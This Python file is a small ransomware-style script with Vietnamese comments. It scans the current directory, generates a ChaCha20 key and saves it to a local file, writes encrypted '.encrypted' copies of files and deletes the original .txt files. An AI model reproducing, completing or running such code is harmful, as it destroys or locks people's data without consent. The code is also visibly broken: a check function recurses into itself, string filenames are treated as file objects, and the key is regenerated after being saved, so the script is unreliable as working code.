import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
from cryptography.hazmat.backends import default_backend

#  duyệt file và add vào 1 list gồm các file cần mã hóa
files = []

# nếu các file muốn mã hóa là hợp lệ thì thêm vào list
for file in os.scandir():
    if (file.name != "RansomEncrypted.py" and file.name != "RansomDecrypted.py" and file.name != ".idea"
            and file.name != ".venv" and file.name != "thekey.txt"):
        files.append(file)


# đọc các file trong đó
def read_file(file):
    #  vòng lặp trong khi không cần thiết. Hàm read_file cần chỉ nhận một file là tham số và
    #  trả về nội dung của file đó.

    with open(file.path, 'r') as already_read_file:
        content_of_file = already_read_file.read()
        return file.name + " " + content_of_file

# mã hóa các file đã đọc trong list


key = os.urandom(32) # tạo key mã hóa
nonce = os.urandom(16)


# Lưu khóa vào file txt
def save_key_to_file(key):
    with open('thekey.txt', 'wb') as ourkey:
        ourkey.write(key)


save_key_to_file(key)


# mã hóa nội dung vs ChaCha20
def encrypt_file(file):
    cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None, backend=default_backend())
    # tạo đối tượng Cipher ()
    # algorithms.ChaCha20(key, nonce) : chỉ định thuật toán mã hóa vs khóa key
    # mode = None : ChaCha20 là một thuật toán mã hóa dòng, nó không yêu cầu chế độ hoạt động như CBC, ECB, etc.
    # backend=default_backend() chỉ định backend để thực hiện các thao tác mã hóa. default_backend() sẽ trả về một đối
    # tượng backend mặc định phù hợp với hệ thống
    encryptor = cipher.encryptor()
    encrypted_content = encryptor.update(file) + encryptor.finalize()
    # đưa content mã hóa vào các file
    return encrypted_content


def is_encrypted(file):
 # kiểm tra nếu file đã mã hóa r thì không mã hóa tiếp nữa
    # đuôi các file bị mã hóa sẽ có tên mới là .txt.encrypted
    encrypted_file_path = file.path + ".encrypted"

    # sau khi tạo file .encrypted thì phải xóa các file ban đầu
    # nếu file là .txt và không phải là txt.encrypted thì xóa file
    for file in os.listdir():
        if file.endswith(".txt") and not file.endswith(".txt.encrypted") and file.name != "thekey.txt":
            os.remove(file.path)
    if not is_encrypted(file):
        file_content = read_file(file)
        encrypting_content = encrypt_file(file_content.encode('utf-8'))

        # Ghi nội dung đã mã hóa vào một tệp mới hoặc ghi đè lên tệp ban đầu
        with open(file.path + ".encrypted", 'wb') as encrypted_file:
            encrypted_file.write(encrypting_content)
    else:
        print(f"File {file.name} is already encrypted.")
        return os.path.exists(encrypted_file_path)


# Kiểm tra xem nếu có khóa rồi thì không tiếp tục tạo khóa nữa
def check_current_key(key):
    if os.path.exists(key) and os.path.getsize(key) > 0:
        return True
    return False


if not check_current_key("thekey.txt"):
    key = os.urandom(32)
else:
    print("WE ALREADY HAVE A KEY")
